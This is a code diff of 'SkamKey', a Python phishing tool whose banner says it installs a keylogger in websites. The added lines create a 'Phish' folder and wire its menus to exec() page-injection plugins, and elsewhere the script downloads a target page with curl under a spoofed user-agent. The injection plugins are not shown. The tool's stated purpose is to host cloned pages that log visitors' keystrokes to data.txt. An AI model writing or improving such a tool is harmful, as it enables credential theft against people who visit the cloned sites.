@@ -29,6 +29,9 @@ def clear(numlines=100):
     print('\n' * numlines)
     draw()
 clear()
+
+os.system('mkdir Phish')
+clear()
 def menu1():
     clear()
     target =input(S12+'Target Page > '+S10)
@@ -38,23 +41,17 @@ def menu1():
     cmd = ("curl --user-agent '"+UserA+"' "+target+" > "+output)
     os.system(cmd)
     clear()
-def menu3():
-    clear()
-    print('comming soon')
-    exit()
 def main1():
     clear()
     print("""\n\n\n\n\nChoose option\n#1-Inject a Downloaded page\n#2-Frame method(No download needed)\n""")
     mn1 = input(S12+'OutPhish > '+S10)
     if mn1 == '1':
         cmd1 = "python plugin.py"
-        os.system(cmd1)
-        subprocess.run(cmd1)
-        print()
+        exec(open('plugin.py').read())
         exit()
     if mn1 == '2':
         clear()
-        menu3()
+        exec(open('pluginframe.py').read())
         exit()
     else:
         clear()
@@ -62,7 +59,7 @@ def main1():
         main1()
 def main():
     clear()
-    print('Welcome to SkamKey,\nMade by Out-Shit https://github.com/Out-Shit\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server.\n')
+    print('Welcome to SkamKey,\nMade by Out-Shit https://github.com/Out-Shit\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server.\nAll the Keylogs will be in the data.txt')
     input()
     clear()
     print("""\n\n\n\n\nChoose option\n#1-Download page\n#2-Inject the page\n""")
